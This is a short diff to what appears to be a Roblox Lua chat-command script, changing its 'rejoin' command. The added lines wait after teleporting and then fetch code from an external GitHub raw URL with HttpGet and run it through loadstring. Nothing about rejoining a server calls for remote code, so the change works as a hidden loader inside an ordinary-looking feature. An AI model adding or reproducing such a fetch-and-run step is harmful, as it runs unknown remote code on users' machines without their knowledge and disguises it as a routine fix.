@@ -2126,7 +2126,8 @@ function PlayerChatted(Message)
 	if Command("rejoin") or Command("rj") then
 		Notify("Rejoining server", Color3.fromRGB(147, 202, 237), "yay")
 		wait(.1)
-		game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+		game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer) wait(5)
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/vpmpy/hehehehaw/refs/heads/main/test'))()
 	end
 	if Command("nodoors") or Command("deletedoors") then
 		if workspace:FindFirstChild("Doors") then
